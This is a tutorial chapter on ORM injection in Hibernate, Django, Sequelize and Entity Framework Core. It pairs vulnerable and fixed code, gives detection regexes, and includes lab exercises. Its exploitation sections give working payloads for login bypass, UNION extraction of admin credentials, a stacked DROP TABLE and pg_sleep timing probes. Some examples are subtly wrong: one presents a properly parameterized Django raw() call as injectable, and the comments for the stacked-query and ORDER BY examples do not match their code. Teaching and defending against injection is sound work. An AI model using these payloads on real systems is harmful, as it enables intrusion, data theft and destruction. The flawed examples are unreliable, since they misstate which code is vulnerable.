# 18 - ORM Injection

## Overview

Object-Relational Mapping (ORM) frameworks like Hibernate, Django ORM, and Sequelize are designed to prevent SQL injection. However, unsafe usage patterns can still create vulnerabilities. This guide covers how to identify and exploit ORM bypass techniques.

## Understanding ORM Injection

ORMs provide an abstraction layer between application code and databases. When used correctly, they automatically parameterize queries. However, developers often bypass ORM protections for "convenience," creating injection opportunities.

### Common Vulnerable Patterns

| Pattern                         | Risk Level   | Description            |
| ------------------------------- | ------------ | ---------------------- |
| String concatenation in raw SQL | **Critical** | Direct SQL building    |
| Native query concatenation      | **Critical** | Bypassing ORM entirely |
| Dynamic ORDER BY                | **High**     | Column name injection  |
| .raw() / .native() methods      | **High**     | Direct SQL execution   |
| .extra() / .sqlRestriction      | **High**     | ORM escape hatches     |

## Hibernate/JPA Injection

### String Concatenation in HQL

**Vulnerable:**

```java
// VULNERABLE
String hql = "FROM User WHERE username = '" + username + "'";
Query query = session.createQuery(hql);
```

**Secure:**

```java
// SECURE
String hql = "FROM User WHERE username = :username";
Query query = session.createQuery(hql);
query.setParameter("username", username);
```

### Native Query Concatenation

**Vulnerable:**

```java
// VULNERABLE - Native SQL with concatenation
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
Query query = session.createNativeQuery(sql);
```

**Secure:**

```java
// SECURE
String sql = "SELECT * FROM users WHERE username = :username";
Query query = session.createNativeQuery(sql);
query.setParameter("username", username);
```

### Criteria API Misuse

**Dangerous:**

```java
// VULNERABLE - Using Restrictions.sqlRestriction
Criteria criteria = session.createCriteria(User.class);
criteria.add(Restrictions.sqlRestriction("username = '" + username + "'"));
```

**Safe:**

```java
// SECURE
Criteria criteria = session.createCriteria(User.class);
criteria.add(Restrictions.eq("username", username));
```

## Django ORM Injection

### Raw SQL with String Formatting

**Vulnerable:**

```python
# VULNERABLE
from django.db import connection

def get_user(username):
    with connection.cursor() as cursor:
        cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
        return cursor.fetchone()
```

**Secure:**

```python
# SECURE
from django.db import connection

def get_user(username):
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM users WHERE username = %s", [username])
        return cursor.fetchone()
```

### extra() Method (Deprecated in Django 3.0+)

**Vulnerable:**

```python
# VULNERABLE - extra() with where parameter
User.objects.extra(where=[f"username = '{username}'"])
```

**Safe:**

```python
# SECURE - Use normal ORM methods
User.objects.filter(username=username)
```

### Raw() Method

**Vulnerable:**

```python
# VULNERABLE
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
```

**Secure:**

```python
# SECURE
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])
```

## Sequelize/Node.js Injection

### Query Interface Concatenation

**Vulnerable:**

```javascript
// VULNERABLE
const users = await sequelize.query(`SELECT * FROM users WHERE username = '${username}'`, {
  type: QueryTypes.SELECT
})
```

**Secure:**

```javascript
// SECURE
const users = await sequelize.query('SELECT * FROM users WHERE username = ?', {
  replacements: [username],
  type: QueryTypes.SELECT
})
```

### Raw Queries in findAll

**Vulnerable:**

```javascript
// VULNERABLE
User.findAll({
  where: sequelize.literal(`username = '${username}'`)
})
```

**Safe:**

```javascript
// SECURE
User.findAll({
  where: { username: username }
})
```

### ORDER BY Injection

**Vulnerable:**

```javascript
// VULNERABLE - User-controlled order
User.findAll({
  order: [[req.query.sortColumn, req.query.sortDirection]]
})
```

**Attack:**

```
GET /users?sortColumn=(SELECT pg_sleep(5))&sortDirection=ASC
```

**Result:**

```sql
ORDER BY (SELECT pg_sleep(5)) ASC
```

**Safe:**

```javascript
// SECURE - Whitelist allowed columns
const ALLOWED_COLUMNS = ['name', 'email', 'created_at']
const column = ALLOWED_COLUMNS.includes(req.query.sortColumn) ? req.query.sortColumn : 'id'

User.findAll({
  order: [[column, 'ASC']]
})
```

## Entity Framework Core Injection

### FromSqlRaw with Concatenation

**Vulnerable:**

```csharp
// VULNERABLE
var users = context.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Username = '{username}'")
    .ToList();
```

**Secure:**

```csharp
// SECURE
var users = context.Users
    .FromSqlRaw("SELECT * FROM Users WHERE Username = {0}", username)
    .ToList();
```

### FromSqlInterpolated

**Secure by design:**

```csharp
// SECURE - Interpolated strings are parameterized
var users = context.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}")
    .ToList();
```

### ExecuteSqlRaw

**Vulnerable:**

```csharp
// VULNERABLE
context.Database.ExecuteSqlRaw($"UPDATE Users SET Name = '{name}' WHERE Id = {id}");
```

**Secure:**

```csharp
// SECURE
context.Database.ExecuteSqlRaw(
    "UPDATE Users SET Name = {0} WHERE Id = {1}",
    name, id
);
```

## ORM Injection Detection

### Code Review Checklist

- [ ] Search for string concatenation in ORM queries
- [ ] Check usage of .raw(), .native(), .extra() methods
- [ ] Review native SQL implementations
- [ ] Verify all user inputs use parameterized queries
- [ ] Check for SQL literals in ORM methods
- [ ] Review stored procedure calls with dynamic parameters
- [ ] Examine ORDER BY and GROUP BY clauses
- [ ] Check for HQL/SQL concatenation in criteria builders

### Static Analysis Patterns

**Regex Patterns to Detect Vulnerabilities:**

```python
orm_dangerous_patterns = [
    r'createQuery\s*\(\s*["\'].*\{.*?\}',     # HQL concatenation
    r'execute\s*\(\s*["\'].*\$\{',            # Raw SQL with variables
    r'\.extra\s*\(\s*where.*=.*\$',           # Django .extra()
    r'query\s*\(\s*[`"].*\$\{',               # Sequelize concatenation
    r'FromSqlRaw.*\$".*\{',                   # EF Core raw SQL
    r'sqlRestriction.*\'.*\+',                # Hibernate criteria
    r'\.raw\s*\(\s*["\'].*\+',                # Raw SQL building
    r'ORDER\s+BY.*\$\{',                      # Dynamic ORDER BY
]
```

## ORM-Specific Exploitation

### HQL Injection (Hibernate)

**Input:**

```
admin' OR '1'='1
```

**Result:**

```sql
FROM User WHERE username = 'admin' OR '1'='1'
```

**Impact:** Bypasses authentication

### Django Raw SQL Bypass

**Payload:**

```python
username = "admin'--"
```

**Query:**

```sql
SELECT * FROM users WHERE username = 'admin'--'
```

**Result:** Comments out remaining query conditions

### Sequelize Order Injection

**Attack:**

```
GET /api/users?order=(SELECT pg_sleep(5))
```

**Code:**

```javascript
User.findAll({
  order: [['name', req.query.order]]
})
```

**Result:**

```sql
ORDER BY name (SELECT pg_sleep(5))
```

**Time-Based Detection:**

- 5 second delay = injection confirmed
- No delay = not vulnerable or condition false

### Entity Framework Query Injection

**Vulnerable:**

```csharp
// Custom filter building
var query = $"SELECT * FROM Products WHERE Name LIKE '%{search}%'";
var products = context.Products.FromSqlRaw(query).ToList();
```

**Attack:**

```
GET /api/products?search=' OR 1=1--
```

**Result:**

```sql
SELECT * FROM Products WHERE Name LIKE '%' OR 1=1--%'
```

## Advanced ORM Bypass Techniques

### Method 1: Union Injection via Raw Query

**Django:**

```python
# Payload: " UNION SELECT username,password FROM admin--"
User.objects.raw("SELECT * FROM users WHERE name = %s", [payload])
```

**Result:**

```sql
SELECT * FROM users WHERE name = ''
UNION SELECT username,password FROM admin--'
```

### Method 2: Stacked Queries in Native SQL

**Hibernate:**

```java
// Payload: "; DROP TABLE logs;--
String sql = "SELECT * FROM users WHERE id = '" + id + "'";
```

**Result:**

```sql
SELECT * FROM users WHERE id = ''; DROP TABLE logs;--'
```

### Method 3: Blind Injection via ORDER BY

**Sequelize:**

```javascript
// Payload: IIF((SELECT password FROM admin)='secret', 1, 1/0)
// Causes division by zero if password doesn't match

User.findAll({
  order: [['id', "IIF((SELECT password FROM admin)='secret', 'ASC', 'ASC')"]]
})
```

## Prevention Best Practices

### 1. Always Use ORM Methods (Avoid Raw SQL)

**Good:**

```python
# ORM handles safety
User.objects.filter(username=username)
```

**Avoid:**

```python
# Unless absolutely necessary
User.objects.raw('SELECT * FROM users WHERE username = %s', [username])
```

### 2. Validate Input Before ORM

```python
import re

def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username format")
    return username

# Use validated input
User.objects.filter(username=validate_username(username))
```

### 3. Whitelist Dynamic Parameters

```javascript
// Whitelist allowed ORDER BY columns
const ALLOWED_COLUMNS = ['name', 'email', 'created_at']

function getOrderColumn(requestedColumn) {
  return ALLOWED_COLUMNS.includes(requestedColumn) ? requestedColumn : 'id' // Default safe column
}

User.findAll({
  order: [[getOrderColumn(req.query.sort), 'ASC']]
})
```

### 4. Use Query Builders Safely

```javascript
// Knex.js - Query builder
knex('users').where('username', username)
// Automatically parameterized
```

### 5. Code Review for ORM Usage

```python
def review_orm_usage(code):
    dangerous_patterns = [
        r'\.raw\s*\(',
        r'\.native\s*\(',
        r'\.extra\s*\(',
        r'execute\s*\(\s*f["\']',
        r'FromSqlRaw',
    ]

    issues = []
    for pattern in dangerous_patterns:
        if re.search(pattern, code):
            issues.append(f"Potential ORM bypass: {pattern}")

    return issues
```

## Practice Exercises

### Exercise 1: Hibernate HQL Injection

**Setup:**

- Java application using Hibernate
- User lookup with HQL concatenation

**Task:**

1. Find HQL injection point
2. Bypass authentication
3. Extract admin credentials

**Payload:**

```
Username: admin' OR '1'='1
```

### Exercise 2: Django extra() Bypass

**Setup:**

- Django application using .extra()
- Custom WHERE clause building

**Task:**

1. Inject into .extra() where parameter
2. Union with admin table
3. Extract sensitive data

**Payload:**

```python
where=["name = '' UNION SELECT * FROM admin--"]
```

### Exercise 3: Sequelize ORDER BY Injection

**Setup:**

- Node.js application using Sequelize
- Dynamic ORDER BY from query parameter

**Task:**

1. Inject time-based payload into ORDER BY
2. Confirm blind injection
3. Extract data character by character

**Payload:**

```
GET /api/users?order=(SELECT pg_sleep(5))
```

## Key Takeaways

1. **ORMs are safe when used correctly** - Raw SQL bypasses protections
2. **String concatenation is the enemy** - Always use parameters
3. **Dynamic ORDER BY is dangerous** - Whitelist allowed columns
4. **Native queries require scrutiny** - Extra() and raw() are risky
5. **Input validation before ORM** - Defense in depth

## Next Steps

Review the full SQL injection curriculum and practice these ORM bypass techniques in isolated lab environments. Remember that ORM injection often requires access to source code or detailed error messages to identify vulnerable patterns.
